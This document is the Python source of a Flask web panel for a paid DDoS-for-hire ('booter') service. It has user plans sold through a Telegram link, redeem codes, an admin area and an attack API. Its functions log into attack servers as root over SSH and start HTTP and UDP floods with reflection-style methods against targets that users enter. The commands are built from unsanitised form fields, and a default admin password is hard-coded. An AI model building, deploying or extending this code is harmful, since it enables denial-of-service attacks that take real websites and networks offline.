import re
import paramiko
from flask import Flask, request, render_template, flash, session, url_for, redirect
import threading, datetime, sqlite3, time
from werkzeug.security import generate_password_hash, check_password_hash
from contextlib import contextmanager
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

limiter = Limiter(
    get_remote_address, app=app,
    default_limits=["1000 per day", "100 per hour"],
    storage_uri="memory://",
)

app.config["SECRET_KEY"] = b"CHANGE_THIS_TO_A_LONG_RANDOM_STRING" #change this to a long random string!
app.config["PERMANENT_SESSION_LIFETIME"] = datetime.timedelta(minutes=15)

LINK_TELEGRAM = "https://t.me/daonlyspark" #your telegram link here!

SERVER = {
    "SERVER_1": ["SERVER_IP", "SERVER_PW", "0"], #config and add more server here!
}

MAX_SERVER = len(SERVER)


def launchCommand(command, SERVER_NUM):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    cli.connect(SERVER[SERVER_NUM][0], port=22, username="root", password=SERVER[SERVER_NUM][1])
    cli.exec_command(command)
    cli.close()


def launchLayer7Attack(method, target, runtime, SERVER_NUM):
    command = ""
    if method == "bypass":
        command = f"cd /root/ && ./s5 GET {target} proxy.txt {runtime} 1000 10"
    else:
        command = f"cd /root/ && node {method}.js {target} {runtime} ./proxy.txt"
    threading.Thread(target=launchCommand, args=(command, SERVER_NUM)).start()


def launchLayer4Attack(method, target, port, runtime, SERVER_NUM):
    command = ""
    if method == "udp":
        command = f"cd /root/ && python3 udp.py {target} {port} {runtime}"
    else:
        return
    threading.Thread(target=launchCommand, args=(command, SERVER_NUM)).start()


def waitEnd(SERVER_NUM, runTime, username):
    SERVER[SERVER_NUM][2] = "1"
    time.sleep(int(runTime))
    SERVER[SERVER_NUM][2] = "0"
    db_query("UPDATE usertbl SET running = CASE WHEN (running + 1) > concurrent THEN concurrent ELSE (running + 1) END WHERE userid = ?", (username,), commit=True)


def runAttack(method, target, runTime, username):
    for SERVER_NUM in SERVER:
        if SERVER[SERVER_NUM][2] == "0":
            threading.Thread(target=waitEnd, args=(SERVER_NUM, runTime, username)).start()
            threading.Thread(target=launchLayer7Attack, args=(method, target, runTime, SERVER_NUM)).start()
            return True
    return False
    
def runAttackLayer4(method, target, port, runTime, username):
    for SERVER_NUM in SERVER:
        if SERVER[SERVER_NUM][2] == "0":
            threading.Thread(target=waitEnd, args=(SERVER_NUM, runTime, username)).start()
            threading.Thread(target=launchLayer4Attack, args=(method, target, port, runTime, SERVER_NUM)).start()
            return True
    return False


@contextmanager
def db_connection():
    db = sqlite3.connect("panel.db")
    db.row_factory = sqlite3.Row
    try:
        yield db
    finally:
        db.close()


def db_query(sql, params=None, fetchone=False, commit=False):
    sql = sql.replace("%s", "?")
    with db_connection() as db:
        cursor = db.cursor()
        if params:
            cursor.execute(sql, params)
        else:
            cursor.execute(sql)
        if commit:
            db.commit()
            return cursor.rowcount
        if fetchone:
            res = cursor.fetchone()
            return dict(res) if res else None
        return [dict(row) for row in cursor.fetchall()]


def init_db():
    queries = [
        """CREATE TABLE IF NOT EXISTS usertbl(
            userid TEXT PRIMARY KEY NOT NULL,
            userpw TEXT NOT NULL,
            expired TEXT,
            userplan TEXT,
            concurrent INTEGER,
            running INTEGER,
            boottime INTEGER,
            userdate DATETIME DEFAULT CURRENT_TIMESTAMP
        )""",
        """CREATE TABLE IF NOT EXISTS codetbl(
            code TEXT PRIMARY KEY NOT NULL,
            codeplan TEXT NOT NULL
        )""",
        """CREATE TABLE IF NOT EXISTS attacklogl7(
            userid TEXT PRIMARY KEY NOT NULL,
            attack1 TEXT DEFAULT '-',
            attack2 TEXT DEFAULT '-',
            attack3 TEXT DEFAULT '-',
            attack4 TEXT DEFAULT '-',
            attack5 TEXT DEFAULT '-',
            attack6 TEXT DEFAULT '-',
            attack7 TEXT DEFAULT '-',
            attack8 TEXT DEFAULT '-',
            attack9 TEXT DEFAULT '-',
            attack10 TEXT DEFAULT '-'
        )""",
        """CREATE TABLE IF NOT EXISTS attacklogl4(
            userid TEXT PRIMARY KEY NOT NULL,
            attack1 TEXT DEFAULT '-',
            attack2 TEXT DEFAULT '-',
            attack3 TEXT DEFAULT '-',
            attack4 TEXT DEFAULT '-',
            attack5 TEXT DEFAULT '-',
            attack6 TEXT DEFAULT '-',
            attack7 TEXT DEFAULT '-',
            attack8 TEXT DEFAULT '-',
            attack9 TEXT DEFAULT '-',
            attack10 TEXT DEFAULT '-'
        )""",
        """CREATE TABLE IF NOT EXISTS announcements(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            content TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""",
    ]
    with db_connection() as db:
        for q in queries:
            db.execute(q)
        cursor = db.cursor()
        cursor.execute("SELECT * FROM usertbl WHERE userid='admin'")
        if not cursor.fetchone():
            hashed_pw = generate_password_hash("1234")
            db.execute(
                "INSERT INTO usertbl(userid, userpw, userplan, concurrent, running, boottime) VALUES('admin', ?, 'MASTER', 10, 10, 3600)",
                (hashed_pw,),
            )
        try:
            db.execute("ALTER TABLE usertbl ADD COLUMN apikey TEXT")
        except sqlite3.OperationalError:
            pass
        db.commit()


init_db()


def checklogin():
    return "user" in session


def is_admin():
    return checklogin() and session.get("userplan") == "MASTER"


def get_announcements(limit=5):
    return db_query("SELECT id, title, content, created_at FROM announcements ORDER BY created_at DESC LIMIT ?", (limit,))


def get_session_data():
    return {
        "username": session["user"],
        "userplan": session["userplan"],
        "concurrent": session["concurrent"],
        "expired": session["expired"],
    }


@app.route("/", methods=["GET", "POST"])
@limiter.limit("15 per minute")
def login():
    if request.method == "GET":
        if checklogin():
            return redirect(url_for("dashboard"))
        return render_template("./sign/login.html")
    userid = request.form.get("username")
    userpw = request.form.get("password")
    data = db_query(
        "SELECT userid, userpw, userplan, concurrent, expired, boottime FROM usertbl WHERE userid=%s",
        (userid,), fetchone=True,
    )
    if not data or not check_password_hash(data["userpw"], userpw):
        return render_template("./sign/login.html", ErrorTitle="ERROR! ", ErrorMessage="Username/Password does not exist")
    session["user"] = data["userid"]
    session["userplan"] = data["userplan"]
    session["concurrent"] = data["concurrent"]
    session["expired"] = data["expired"]
    session["boottime"] = data["boottime"]
    return redirect(url_for("dashboard"))


@app.route("/register", methods=["GET", "POST"])
@limiter.limit("10 per minute")
def register():
    if request.method == "GET":
        if checklogin():
            return redirect(url_for("dashboard"))
        return render_template("./sign/register.html")
    userid = request.form.get("username")
    userpw = request.form.get("password")
    reuserpw = request.form.get("repassword")
    if userpw != reuserpw:
        return render_template("./sign/register.html", ErrorTitle="ERROR! ", ErrorMessage="Password is different")
    if not userid or not userpw or len(userid) < 3 or len(userpw) < 4:
        return render_template("./sign/register.html", ErrorTitle="ERROR! ", ErrorMessage="Username min 3 chars, password min 4 chars")
    if not re.match(r'^[a-zA-Z0-9_]+$', userid):
        return render_template("./sign/register.html", ErrorTitle="ERROR! ", ErrorMessage="Username can only contain letters, numbers, underscores")
    checkusername = db_query("SELECT userid FROM usertbl WHERE userid=%s", (userid,), fetchone=True)
    if not checkusername:
        hashed_pw = generate_password_hash(userpw)
        db_query(
            "INSERT INTO usertbl(userid, userpw, userplan, concurrent, running, boottime) VALUES(%s, %s, 'FREE', 0, 0, 0)",
            (userid, hashed_pw), commit=True,
        )
        return render_template("./sign/login.html", ErrorTitle="NOTICE! ", ErrorMessage="Register Success")
    return render_template("./sign/register.html", ErrorTitle="ERROR! ", ErrorMessage="Username already exist")


@app.route("/logout", methods=["GET"])
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard", methods=["GET"])
def dashboard():
    if not checklogin():
        return redirect(url_for("login"))
    logs = db_query(
        "SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl7 WHERE userid=%s",
        (session["user"],), fetchone=True,
    )
    smethod, starget, sduration, count = [], [], [], 0
    if logs:
        attack_logs = [v for v in logs.values() if v and v != "-"]
        count = len(attack_logs)
        for log in attack_logs:
            parts = log.split("---")
            if len(parts) >= 4:
                smethod.append(parts[1])
                starget.append(parts[2])
                sduration.append(parts[3])
    announcements = get_announcements(3)
    user_count = db_query("SELECT COUNT(*) as cnt FROM usertbl", fetchone=True)
    return render_template(
        "./dashboard.html", **get_session_data(),
        count=count, smethod=smethod, starget=starget, sduration=sduration,
        announcements=announcements, user_count=user_count["cnt"] if user_count else 0,
    )


@app.route("/login", methods=["GET"])
def login2():
    if checklogin():
        return redirect(url_for("dashboard"))
    return render_template("./sign/login.html")


@app.errorhandler(404)
def error_404(error):
    return render_template("./error/404.html"), 404

@app.errorhandler(403)
def error_403(error):
    return render_template("./error/403.html"), 403

@app.errorhandler(405)
def error_405(error):
    return render_template("./error/405.html"), 405


@app.route("/contact", methods=["GET"])
def contact():
    return redirect(LINK_TELEGRAM)


@app.route("/service", methods=["POST"])
def service():
    return "hi"


@app.route("/layer4", methods=["GET", "POST"])
def layer4():
    if not checklogin():
        return redirect(url_for("login"))
    if request.method == "GET":
        logs = db_query(
            "SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl4 WHERE userid=%s",
            (session["user"],), fetchone=True,
        )
        l4_method, l4_target, l4_port, l4_duration, count = [], [], [], [], 0
        if logs:
            attack_logs = [v for v in logs.values() if v and v != "-"]
            count = len(attack_logs)
            for log in attack_logs:
                parts = log.split("---")
                if len(parts) >= 5:
                    l4_method.append(parts[1])
                    l4_target.append(parts[2])
                    l4_port.append(parts[3])
                    l4_duration.append(parts[4])
        return render_template(
            "./service/layer4.html", **get_session_data(),
            count=count, l4_method=l4_method, l4_target=l4_target, l4_port=l4_port, l4_duration=l4_duration,
        )
    
    uMethod = request.form.get("methods")
    uHost = str(request.form.get("host", "")).strip()
    uPort = request.form.get("port")
    uTime = request.form.get("duration")
    uUsername = session["user"]
    
    if not uMethod or not uHost or not uPort or not uTime:
        flash("Error: Missing fields!")
        return redirect(url_for("layer4"))
    
    try:
        uTime_int = int(uTime)
        if uTime_int <= 0 or uTime_int > 3600:
            flash("Error: Invalid time duration.")
            return redirect(url_for("layer4"))
    except ValueError:
        flash("Error: Invalid time duration.")
        return redirect(url_for("layer4"))
        
    user_data = db_query("SELECT running, boottime FROM usertbl WHERE userid=%s", (uUsername,), fetchone=True)
    if not user_data:
        return redirect(url_for("login"))
    
    running = int(user_data["running"])
    boottime = int(user_data["boottime"])
    
    if running <= 0:
        flash("No concurrents left!")
        return redirect(url_for("layer4"))
    if boottime < int(uTime):
        flash("Boottime Excess")
        return redirect(url_for("layer4"))
        
    db_query("UPDATE usertbl SET running=running-1 WHERE userid=%s", (uUsername,), commit=True)
    if not runAttackLayer4(uMethod, uHost, uPort, uTime, uUsername):
        flash("Attack server is full! Please wait moment")
        db_query("UPDATE usertbl SET running=running+1 WHERE userid=%s", (uUsername,), commit=True)
        return redirect(url_for("layer4"))
        
    flash("Attack started!")
    loggingL4(session["user"], uMethod, uHost, uPort, uTime)
    return redirect(url_for("layer4"))


def loggingL4(username, method, target, port, duration):
    logs = db_query(
        "SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl4 WHERE userid=%s",
        (username,), fetchone=True,
    )
    new_log = f"{username}---{method}---{target}---{port}---{duration}"
    if not logs:
        db_query(
            "INSERT INTO attacklogl4(userid, attack1) VALUES(%s, %s)",
            (username, new_log), commit=True,
        )
        return
    log_values = list(logs.values())
    new_logs = [new_log] + log_values[:9]
    db_query(
        "UPDATE attacklogl4 SET attack1=%s, attack2=%s, attack3=%s, attack4=%s, attack5=%s, attack6=%s, attack7=%s, attack8=%s, attack9=%s, attack10=%s WHERE userid=%s",
        (*new_logs, username), commit=True,
    )


def loggingL7(username, method, target, duration):
    logs = db_query(
        "SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl7 WHERE userid=%s",
        (username,), fetchone=True,
    )
    new_log = f"{username}---{method}---{target}---{duration}"
    if not logs:
        db_query(
            "INSERT INTO attacklogl7(userid, attack1) VALUES(%s, %s)",
            (username, new_log), commit=True,
        )
        return
    log_values = list(logs.values())
    new_logs = [new_log] + log_values[:9]
    db_query(
        "UPDATE attacklogl7 SET attack1=%s, attack2=%s, attack3=%s, attack4=%s, attack5=%s, attack6=%s, attack7=%s, attack8=%s, attack9=%s, attack10=%s WHERE userid=%s",
        (*new_logs, username), commit=True,
    )


@app.route("/layer7", methods=["GET", "POST"])
@limiter.limit("30 per minute")
def layer7():
    if not checklogin():
        return redirect(url_for("login"))
    if request.method == "GET":
        logs = db_query(
            "SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl7 WHERE userid=%s",
            (session["user"],), fetchone=True,
        )
        smethod, starget, sduration, count = [], [], [], 0
        if logs:
            attack_logs = [v for v in logs.values() if v and v != "-"]
            count = len(attack_logs)
            for log in attack_logs:
                parts = log.split("---")
                if len(parts) >= 4:
                    smethod.append(parts[1])
                    starget.append(parts[2])
                    sduration.append(parts[3])
        return render_template(
            "./service/layer7.html", **get_session_data(),
            count=count, smethod=smethod, starget=starget, sduration=sduration,
        )
    uMethod = request.form.get("methods")
    uTarget = str(request.form.get("target", "")).strip()
    uTime = request.form.get("duration")
    uUsername = session["user"]
    if not uMethod or not uTarget or not uTime:
        flash("Error: Missing fields!")
        return redirect(url_for("layer7"))
    try:
        uTime_int = int(uTime)
        if uTime_int <= 0 or uTime_int > 3600:
            raise ValueError
    except ValueError:
        flash("Error: Invalid time duration.")
        return redirect(url_for("layer7"))
    if not re.match(r'^https?://[\w.-]+(?:/[\w./?%&=-]*)?$', uTarget) and not re.match(r'^[\d\.]+$', uTarget):
        flash("Error: Invalid target format.")
        return redirect(url_for("layer7"))
    user_data = db_query("SELECT running, boottime FROM usertbl WHERE userid=%s", (uUsername,), fetchone=True)
    if not user_data:
        return redirect(url_for("login"))
    running = int(user_data["running"])
    boottime = int(user_data["boottime"])
    if running <= 0:
        flash("No concurrents left!")
        return redirect(url_for("layer7"))
    if boottime <= 0:
        flash("No plan active!")
        return redirect(url_for("layer7"))
    if boottime < int(uTime):
        flash("Boottime Excess")
        return redirect(url_for("layer7"))
    db_query("UPDATE usertbl SET running=running-1 WHERE userid=%s", (uUsername,), commit=True)
    if not runAttack(uMethod, uTarget, uTime, uUsername):
        flash("Attack server is full! Please wait moment")
        db_query("UPDATE usertbl SET running=running+1 WHERE userid=%s", (uUsername,), commit=True)
        return redirect(url_for("layer7"))
    flash("Attack started!")
    loggingL7(session["user"], uMethod, uTarget, uTime)
    return redirect(url_for("layer7"))


@app.route("/plans", methods=["GET"])
def plans():
    if not checklogin():
        return redirect(url_for("login"))
    return render_template("./purchase/plans.html", **get_session_data())


@app.route("/redeem", methods=["GET", "POST"])
def redeem():
    if not checklogin():
        return redirect(url_for("login"))
    if request.method == "GET":
        return render_template("./purchase/redeem.html", **get_session_data())
    uCode = request.form.get("code")
    code_data = db_query("SELECT codeplan FROM codetbl WHERE code=%s", (uCode,), fetchone=True)
    if not code_data:
        flash("Code not exist!")
        return redirect(url_for("redeem"))
    checkcode = code_data["codeplan"]
    length = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
    plans_config = {
        "Bronze": {"boottime": 1200, "concurrent": 1},
        "Silver": {"boottime": 1500, "concurrent": 2},
        "Gold": {"boottime": 1800, "concurrent": 3},
        "Diamond": {"boottime": 2400, "concurrent": 5},
        "Master": {"boottime": 3600, "concurrent": 20},
    }
    if checkcode in plans_config:
        config = plans_config[checkcode]
        db_query(
            "UPDATE usertbl SET userplan=%s, boottime=%s, expired=%s, concurrent=%s, running=%s WHERE userid=%s",
            (checkcode, config["boottime"], length, config["concurrent"], config["concurrent"], session["user"]),
            commit=True,
        )
        flash(f"Success! Plan: {checkcode}")
        session["concurrent"] = config["concurrent"]
        session["boottime"] = config["boottime"]
        session["userplan"] = checkcode
        session["expired"] = length
    db_query("DELETE FROM codetbl WHERE code=%s", (uCode,), commit=True)
    return redirect(url_for("redeem"))


@app.route("/api", methods=["GET"])
def api():
    if not checklogin():
        return redirect(url_for("login"))
    user_data = db_query("SELECT apikey FROM usertbl WHERE userid=?", (session["user"],), fetchone=True)
    apikey = user_data["apikey"] if user_data else None
    return render_template("./api/api.html", **get_session_data(), apikey=apikey)

@app.route("/api/generate", methods=["POST"])
@limiter.limit("5 per minute")
def api_generate():
    if not checklogin():
        return redirect(url_for("login"))
    if session["userplan"] not in ["Gold", "Diamond", "Master", "MASTER"]:
        flash("You do not have permission to generate an API key. Please upgrade your plan.")
        return redirect(url_for("api"))
    
    import uuid
    new_key = str(uuid.uuid4()).replace("-", "")
    db_query("UPDATE usertbl SET apikey=? WHERE userid=?", (new_key, session["user"]), commit=True)
    flash("API key generated successfully!")
    return redirect(url_for("api"))


@app.route("/api/attack", methods=["GET"])
@limiter.limit("5 per minute")
def api_attack():
    apikey = request.args.get("key")
    host = request.args.get("host")
    port = request.args.get("port")
    duration = request.args.get("time")
    method = request.args.get("method")
    
    if not all([apikey, host, duration, method]):
        return {"status": "error", "message": "Missing parameters"}, 400
        
    user = db_query("SELECT userid, userplan, running, boottime FROM usertbl WHERE apikey=?", (apikey,), fetchone=True)
    if not user:
        return {"status": "error", "message": "Invalid API key"}, 403
        
    try:
        duration_int = int(duration)
        if duration_int <= 0 or duration_int > 3600:
            return {"status": "error", "message": "Invalid duration"}, 400
    except ValueError:
        return {"status": "error", "message": "Invalid duration"}, 400
        
    if int(user["running"]) <= 0:
        return {"status": "error", "message": "No concurrents available"}, 403
    if int(user["boottime"]) < duration_int:
        return {"status": "error", "message": "Duration exceeds your plan limits"}, 403
        
    # Check if method belongs to L4 or L7
    l4_methods = ["udp", "tcp", "ldap", "ntp", "ovh"]
    l7_methods = ["bypass", "http", "get", "post"] # Add more as needed
    
    success = False
    if method.lower() in l4_methods:
        if not port:
            return {"status": "error", "message": "Port required for Layer 4 methods"}, 400
        db_query("UPDATE usertbl SET running=running-1 WHERE userid=?", (user["userid"],), commit=True)
        success = runAttackLayer4(method, host, port, duration, user["userid"])
        if success:
            loggingL4(user["userid"], method, host, port, duration)
    elif method.lower() in l7_methods:
        db_query("UPDATE usertbl SET running=running-1 WHERE userid=?", (user["userid"],), commit=True)
        success = runAttack(method, host, duration, user["userid"])
        if success:
            loggingL7(user["userid"], method, host, duration)
    else:
        return {"status": "error", "message": "Unsupported method"}, 400
        
    if success:
        return {"status": "success", "message": "Attack started!"}
    else:
        db_query("UPDATE usertbl SET running=running+1 WHERE userid=?", (user["userid"],), commit=True)
        return {"status": "error", "message": "All servers are currently busy"}, 503

@app.route("/settings", methods=["GET", "POST"])
@limiter.limit("5 per minute")
def settings():
    if not checklogin():
        return redirect(url_for("login"))
    if request.method == "GET":
        return render_template("./settings.html", **get_session_data())
    oldpw = request.form.get("old_password")
    newpw = request.form.get("new_password")
    user_data = db_query("SELECT userpw FROM usertbl WHERE userid=?", (session["user"],), fetchone=True)
    if not user_data or not check_password_hash(user_data["userpw"], oldpw):
        flash("Error: Incorrect current password.")
    elif newpw and len(newpw) >= 4:
        hashed_pw = generate_password_hash(newpw)
        db_query("UPDATE usertbl SET userpw=? WHERE userid=?", (hashed_pw, session["user"]), commit=True)
        flash("Password updated successfully!")
    else:
        flash("Error: New password must be at least 4 characters.")
    return redirect(url_for("settings"))


@app.route("/admin", methods=["GET"])
def admin_dashboard():
    if not is_admin():
        return redirect(url_for("dashboard"))
    users = db_query("SELECT userid, userplan, concurrent, running, boottime, expired, userdate FROM usertbl ORDER BY userdate DESC")
    user_count = len(users)
    announcements = get_announcements(10)
    codes = db_query("SELECT code, codeplan FROM codetbl")
    return render_template(
        "./admin/dashboard.html", **get_session_data(),
        users=users, user_count=user_count,
        server_count=MAX_SERVER,
        announcements=announcements, codes=codes,
    )


@app.route("/admin/users", methods=["GET"])
def admin_users():
    if not is_admin():
        return redirect(url_for("dashboard"))
    users = db_query("SELECT userid, userplan, concurrent, running, boottime, expired, userdate FROM usertbl ORDER BY userdate DESC")
    return render_template("./admin/users.html", **get_session_data(), users=users)


@app.route("/admin/user/edit", methods=["POST"])
def admin_user_edit():
    if not is_admin():
        return redirect(url_for("dashboard"))
    userid = request.form.get("userid")
    userplan = request.form.get("userplan")
    concurrent = request.form.get("concurrent", type=int)
    boottime = request.form.get("boottime", type=int)
    if userid and userplan is not None and concurrent is not None and boottime is not None:
        db_query(
            "UPDATE usertbl SET userplan=?, concurrent=?, running=?, boottime=? WHERE userid=?",
            (userplan, concurrent, concurrent, boottime, userid), commit=True,
        )
        flash(f"Updated user: {userid}")
    return redirect(url_for("admin_users"))


@app.route("/admin/user/delete", methods=["POST"])
def admin_user_delete():
    if not is_admin():
        return redirect(url_for("dashboard"))
    userid = request.form.get("userid")
    if userid and userid != "admin":
        db_query("DELETE FROM usertbl WHERE userid=?", (userid,), commit=True)
        db_query("DELETE FROM attacklogl7 WHERE userid=?", (userid,), commit=True)
        flash(f"Deleted user: {userid}")
    else:
        flash("Cannot delete admin account.")
    return redirect(url_for("admin_users"))


@app.route("/admin/user/resetpw", methods=["POST"])
def admin_user_resetpw():
    if not is_admin():
        return redirect(url_for("dashboard"))
    userid = request.form.get("userid")
    newpw = request.form.get("newpw", "1234")
    if userid:
        hashed_pw = generate_password_hash(newpw)
        db_query("UPDATE usertbl SET userpw=? WHERE userid=?", (hashed_pw, userid), commit=True)
        flash(f"Password reset for {userid} to: {newpw}")
    return redirect(url_for("admin_users"))


@app.route("/admin/announcements", methods=["GET"])
def admin_announcements():
    if not is_admin():
        return redirect(url_for("dashboard"))
    announcements = get_announcements(50)
    return render_template("./admin/announcements.html", **get_session_data(), announcements=announcements)


@app.route("/admin/announcement/create", methods=["POST"])
def admin_announcement_create():
    if not is_admin():
        return redirect(url_for("dashboard"))
    title = request.form.get("title", "").strip()
    content = request.form.get("content", "").strip()
    if title and content:
        db_query("INSERT INTO announcements(title, content) VALUES(?, ?)", (title, content), commit=True)
        flash("Announcement created!")
    else:
        flash("Title and content are required.")
    return redirect(url_for("admin_announcements"))


@app.route("/admin/announcement/delete", methods=["POST"])
def admin_announcement_delete():
    if not is_admin():
        return redirect(url_for("dashboard"))
    ann_id = request.form.get("id", type=int)
    if ann_id:
        db_query("DELETE FROM announcements WHERE id=?", (ann_id,), commit=True)
        flash("Announcement deleted.")
    return redirect(url_for("admin_announcements"))


@app.route("/admin/codes", methods=["GET"])
def admin_codes():
    if not is_admin():
        return redirect(url_for("dashboard"))
    codes = db_query("SELECT code, codeplan FROM codetbl")
    return render_template("./admin/codes.html", **get_session_data(), codes=codes)


@app.route("/admin/code/create", methods=["POST"])
def admin_code_create():
    if not is_admin():
        return redirect(url_for("dashboard"))
    code = request.form.get("code", "").strip()
    if not code:
        import uuid
        code = str(uuid.uuid4()).split("-")[0].upper()
    codeplan = request.form.get("codeplan", "").strip()
    if code and codeplan:
        existing = db_query("SELECT code FROM codetbl WHERE code=?", (code,), fetchone=True)
        if not existing:
            db_query("INSERT INTO codetbl(code, codeplan) VALUES(?, ?)", (code, codeplan), commit=True)
            flash(f"Code created: {code} ({codeplan})")
        else:
            flash("Code already exists.")
    else:
        flash("Code and plan are required.")
    return redirect(url_for("admin_codes"))


@app.route("/admin/code/delete", methods=["POST"])
def admin_code_delete():
    if not is_admin():
        return redirect(url_for("dashboard"))
    code = request.form.get("code")
    if code:
        db_query("DELETE FROM codetbl WHERE code=?", (code,), commit=True)
        flash(f"Code deleted: {code}")
    return redirect(url_for("admin_codes"))


@app.route("/plans/bronze", methods=["GET"])
def bronze():
    return redirect(LINK_TELEGRAM)

@app.route("/plans/silver", methods=["GET"])
def silver():
    return redirect(LINK_TELEGRAM)

@app.route("/plans/gold", methods=["GET"])
def gold():
    return redirect(LINK_TELEGRAM)

@app.route("/plans/diamond", methods=["GET"])
def diamond():
    return redirect(LINK_TELEGRAM)

@app.route("/plans/master", methods=["GET"])
def master():
    return redirect(LINK_TELEGRAM)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port="80", debug=False, threaded=True)
